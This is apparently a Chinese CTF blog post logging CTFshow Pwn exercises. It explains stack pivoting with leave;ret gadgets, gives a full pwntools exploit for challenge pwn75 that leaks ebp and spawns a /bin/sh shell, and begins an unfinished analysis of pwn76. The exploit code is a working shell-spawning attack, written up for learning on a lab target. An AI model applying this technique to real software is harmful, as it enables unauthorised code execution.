<p>我们在调用foo函数的时候主要做的是三件事</p>
<p>1，牢记foo结束之后返回哪边</p>
<p>2，牢记上层函数的栈底</p>
<p>3，牢记foo函数栈开始的地方</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761181635299-1f0fdf6f-082e-49c5-bd14-4d3ee4176318.png" srcset="/img/loading.gif" lazyload></p>
<p>然后foo结束之后，会调用leave和ret两条指令</p>
<p>这两条指令干的活就像之前的逆过程一样</p>
<p>1，清空栈，还原栈空间</p>
<p>2，还原栈底</p>
<p>3，还原执行流</p>
<p>而在这个过程中，栈顶指针的内容由ebp寄存器控制</p>
<p>但ebp是可以被篡改的</p>
<p>篡改的话，mov esp，ebp之后，esp也**<u>有可能</u>**会被篡改</p>
<p>从而之后pop eip的eip与执行流也被篡改</p>
<p>这就是攻击的漏洞</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761182554230-7e7cea00-51b1-4ed3-a665-6ee9515a7138.png" srcset="/img/loading.gif" lazyload></p>
<p>为什么说有可能，是因为这边有顺序啊，一般肯定难改啊</p>
<p>但是扭曲顺序不就是了</p>
<p>我们把栈上的内容换为leave ret的地址</p>
<p>直接返回到leave函数地址，从而我们可以执行两次leave，一次ret</p>
<p>所以这边pop ebp之后，eip会再干一次mov操作</p>
<p>所以我们就可以先改再mov，这样子连过去改esp，把他骗到别的地方去了</p>
<p>这也就是栈迁移的内容了</p>
<h3 id="栈迁移的具体步骤"><a href="#栈迁移的具体步骤" class="headerlink" title="栈迁移的具体步骤"></a>栈迁移的具体步骤</h3><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761182743156-ada709a9-105b-4a0c-a631-6c16eb880dc9.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761183284376-a1ae7dd9-dac1-40d5-a5da-f3e8183776ce.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761183303482-37034f82-7a58-484c-9124-1b64b5936f30.png" srcset="/img/loading.gif" lazyload></p>
<p>具体的步骤如图，来两次了</p>
<p>首先我们需要确定缓冲区变量溢出的时候至少能覆盖俩位置，就是意思是不能太小，小到完全没有那根本就搞不了，这边有4个位置，算是正好</p>
<p>接下来第二步找我们迁移到哪里去，记这个地方为HijackAddr，这个要具体题目具体分析</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761196571732-c74f3eda-3051-4cd1-8edf-31087590f8c5.png" srcset="/img/loading.gif" lazyload></p>
<p>第三步找一段leave ret gadget的地址，记这个地方叫LeaveRetAddr</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ROPgadget --binary ./pwn75 --only &quot;leave|ret&quot;<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761196358398-3ef1aed0-1a24-4b59-91db-e7f16cd8e14c.png" srcset="/img/loading.gif" lazyload></p>
<p>确定在0x080484d5的地方</p>
<p>LeaveRetAddr&#x3D;0x080484d5</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761198371948-5eab04ae-3a6a-47a6-9b02-5900a9beb0d3.png" srcset="/img/loading.gif" lazyload></p>
<p>（其实这上边任意一个都一样）</p>
<p>第四步，设置缓冲区变量，使其将栈上 ebp 覆盖为 HijackAddr-4，将 ret 覆盖为LeaveRetAddr</p>
<p>第五步开始执行指令，共6条，两个Leave-Ret序列：</p>
<p><strong>第一阶段：</strong></p>
<p>1，执行指令：mov esp, ebp，还原栈顶指针至当前函数栈底；此时 esp 指向栈上被篡改的 ebp 数据，即 HijackAddr-4；（让esp指向ebp先）</p>
<p>2，执行指令：pop ebp，将篡改的HijackAddr-4放入 ebp 寄存器内；此时 esp 上移，指向栈上被篡改的 ret 数据（相当于leave，这边在往ebp里塞东西，塞我们会ret到leave的位置）</p>
<p>3，执行指令：pop eip，将LeaveRetAddr放入eip寄存器内，篡改执行流，以执行第二遍leave指令；（相当于ret，跳到leave指令处，载入第二步塞进去的地址，准备第二次leave）</p>
<p><strong>第二阶段：</strong></p>
<p>4，执行指令（第二遍的leave指令）：mov esp, ebp，将HijackAddr-4移入 esp 寄存器内，即栈顶指针被劫持指向了 HijackAddr-4，发生了栈的迁移；（再一次指向ebp，发现被变了，栈也就迁移过去了）</p>
<p>5，执行指令（第二遍的leave指令）：pop ebp，无实际效用，ebp寄存器仍为HijackAddr-4，但此时esp 被拉高4个字节，指向HijackAddr；（第二个leave，但已经无意义了）</p>
<p>6，执行指令：pop eip，将HijackAddr移入eip 内，成功篡改执行流至shellcode区域；（我们现在返回ret，就会迎来我们的HiJackAddr地址，也就是我们放Shellcode的地方）</p>
<p>第六步就是提权执行了</p>
<h3 id="栈迁移的实施条件"><a href="#栈迁移的实施条件" class="headerlink" title="栈迁移的实施条件"></a>栈迁移的实施条件</h3><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761195818230-8c18c48b-b1a9-4428-bfd4-908a8ed2158f.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="就题论题"><a href="#就题论题" class="headerlink" title="就题论题"></a>就题论题</h3><p>好了我们大概理解之后就可以开始就题论题了</p>
<p>这边我们在ida是可以看到system的</p>
<p>我们只需要写&#x2F;bin&#x2F;sh就好</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761197384823-21b0ae6c-872b-4e5a-a070-a17ee56e7972.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761197406310-517e9627-e220-4737-9af4-53efde3f7041.png" srcset="/img/loading.gif" lazyload></p>
<p>system&#x3D;0x8048400</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761197579777-841a533b-3a9d-46b5-95e0-813700dc8f3d.png" srcset="/img/loading.gif" lazyload></p>
<p>我们的劫持目标地址，即最终目的地HiJackAddr为缓冲区变量 s 的起始地址。要计算这一地址，可采取 栈上ebp + 偏移量的方法</p>
<p>栈上ebp可由 printf 函数泄露得到</p>
<p>而偏移量的确定则需要进行调试分析</p>
<p>如图所示，我们动调在第二个read这边之后设置断点，r过来，然后先正常输入，第二次输入的时候仅输入 aaaa 进行定位</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761198930055-2428c3bb-510a-488e-a724-cf940cc1f974.png" srcset="/img/loading.gif" lazyload></p>
<p>这样子之后就能看看了</p>
<p>直接stack 30看看栈情况</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761198973543-0030f2e0-c976-46ac-9175-2d330fa30e81.png" srcset="/img/loading.gif" lazyload></p>
<p>由图可知，此时 esp 位于 0xffffcf10 处，即缓冲区变量开头的’aaaa’，ebp寄存器位于 0xffffcf38，而该地址所存内容，即栈上 ebp 为 0xffffcf48，为上层main函数的old ebp。old ebp 与 缓冲区变量 相距 0x38，这说明只要使用 printf 泄露出攻击时栈上ebp所存地址，将该地址减去0x38即为 s 的准确地址，即栈迁移最终要劫持到的地方。</p>
<p>我们的代码要先截获old_ebp，然后去减0x38，最后把这个值递给ebp，从而传给esp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)<br>io = remote(&quot;pwn.challenge.ctf.show&quot;,28297)<br><br>elf = ELF(&#x27;./pwn75&#x27;)<br>system = elf.plt[&#x27;system&#x27;]<br>#system=0x8048400(都一样)<br>LeaveRetAddr=0x080484d5<br><br>io.recvuntil(&#x27;codename:&#x27;)<br>payload1=b&#x27;a&#x27;*0x1D+b&#x27;zhaodaonile&#x27;<br>#是一样的，加起来28个字符就行，用ljust也一样，为了做个坐标，好发完之后截取<br>io.send(payload1)<br>io.recvuntil(&#x27;zhaodaonile&#x27;)<br>old_ebp=u32(io.recv(4).ljust(4,b&#x27;\x00&#x27;))<br>HiJackAddr=old_ebp-0x38<br>#算出HiJackAddr了<br><br>payload2=(p32(system)+b&#x27;aaaa&#x27;+p32(HiJackAddr+12)+b&#x27;/bin/sh\x00&#x27;).ljust(0x28,b&#x27;a&#x27;)+p32(HiJackAddr-4)+p32(LeaveRetAddr)<br>io.recvuntil(&#x27;do?&#x27;)<br>io.send(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><code>p32(HiJackAddr+12)</code>: 这是<code>system</code>函数的参数。它指向字符串<code>/bin/sh</code>的地址。<code>HiJackAddr+12</code>的计算逻辑是：<code>HiJackAddr</code>是迁移后的新栈顶，从新栈顶开始跳过<code>p32(system)</code>（4字节）和<code>b&#39;aaaa&#39;</code>（4字节）以及<code>p32(HiJackAddr+12)</code>本身这4个字节的地址，总共12字节，正好指向后面的<code>/bin/sh</code>字符串。</p>
<p>其实就是32位传参，精准找到&#x2F;bin&#x2F;sh之后把这个传过去</p>
<p>补满28个之后，写上HiJackAddr的前4位，这玩意会被弹到ebp里，然后弹给esp，准备好第二次leave，这边减4是为了保证从ROP链的开头开始执行</p>
<p>最后把返回地址覆盖为第二次leave就好</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761200623461-10e4fb04-5070-4f27-982b-e8909173fe71.png" srcset="/img/loading.gif" lazyload></p>
<p>终于完成了！！！！！！！！</p>
<p>ctfshow{16f47ea2-9a94-43c7-9dbb-4fea7eeda47a}</p>
<p>还有需要注意的是我们这边只能用send函数，不能用sendline去传</p>
<h3 id="pwntools中send和sendline的区别"><a href="#pwntools中send和sendline的区别" class="headerlink" title="pwntools中send和sendline的区别"></a>pwntools中send和sendline的区别</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15855666.html">https://www.cnblogs.com/ZIKH26/articles/15855666.html</a></p>
<h2 id="pwn76"><a href="#pwn76" class="headerlink" title="pwn76"></a>pwn76</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761200648578-b1ff1587-183e-408e-9647-8be8b9b5af62.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761200691348-2d922a69-729a-4749-937c-b7d91ab9a118.png" srcset="/img/loading.gif" lazyload></p>
<p>欸？静态，开了栈金丝雀？</p>
<p>开了栈金丝雀估计就要绕绕了，跟题目说的一样，得理清逻辑</p>
<p>尝试运行一下看看：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761200749882-fd1315a6-3831-4173-bf7a-3c7338d59eab.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761200774385-0741c0d4-b717-4bcb-9796-f85bd3645dc9.png" srcset="/img/loading.gif" lazyload></p>
<p>这是什么哈希，看起来是假的</p>
<p>ida看看吧还是</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761200816913-7c2a18da-9f90-46a0-bf98-b2a3886f40f5.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761200918179-b9526ba5-d348-4956-9170-3bec48f81691.png" srcset="/img/loading.gif" lazyload></p>
<p>这边可以看到程序里就有现成的后门函数</p>
<p>我们只要能进到这个correct函数里，然后做到让input等于0xDEADBEEF就行了</p>
<p>这怎么那么像逆向啊</p>
<p>好理一下程序在干啥</p>
<p>一开始读取0x30以内的输入，然后进Base64Decode函数</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761201046596-132deae9-a7e0-461e-843d-64c26f73ad39.png" srcset="/img/loading.gif" lazyload></p>
<p>函数执行后，解码出的原始数据长度保存在返回值 <code>v7</code>中，而解码后的数据本身则存放在由指针 <code>v5</code>所指向的内存位置里。Base64编码常用于将二进制数据转换为可打印的ASCII字符，以便于传输。这里进行解码是为了还原用户输入的原始数据。</p>
<p>接着去进行长度校验与数据复制：程序检查解码后的数据长度是否大于0xC（即十进制的12）。如果超过12字节，就会输出 “Input Error!”。</p>
<p>只有长度不超过12字节时，程序才会将解码后的数据复制到一个全局变量input中。</p>
<p>最后进行验证</p>
<p>程序调用auth函数对复制到input中的数据进行验证。如果 auth函数返回1，则调用我们的后门函数，这很可能意味着成功获取了flag</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761201514551-03a2af34-3d2f-463f-9a7d-6859592a151d.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761201600535-34379313-9571-4c0b-9b84-75df204522c8.png" srcset="/img/loading.gif" lazyload></p>
<p>等等，我再想想，脑子要烧起来了</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CTFshow-Pwn-10月记录</div>
      <div>https://mei-you-qian.github.io/2025/10/31/CTFshow-Pwn-10月记录/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Meiyouqian</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年10月31日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/11/02/2025NSSCTF/" title="2025SWPU-NSSCTF">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2025SWPU-NSSCTF</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/10/29/2025%E5%B9%B3%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/" title="2025平航杯初赛">
                        <span class="hidden-mobile">2025平航杯初赛</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="twikoo"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
        var options = Object.assign(
          {"envId":"cloud1-9g1zftrh46f4164f","region":"ap-shanghai","path":"window.location.pathname"},
          {
            el: '#twikoo',
            path: 'window.location.pathname',
            onCommentLoaded: function() {
              Fluid.utils.listenDOMLoaded(function() {
                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
                Fluid.plugins.imageCaption(imgSelector);
                Fluid.plugins.fancyBox(imgSelector);
              });
            }
          }
        )
        twikoo.init(options)
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="/js/scrollAnimation.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
</html>
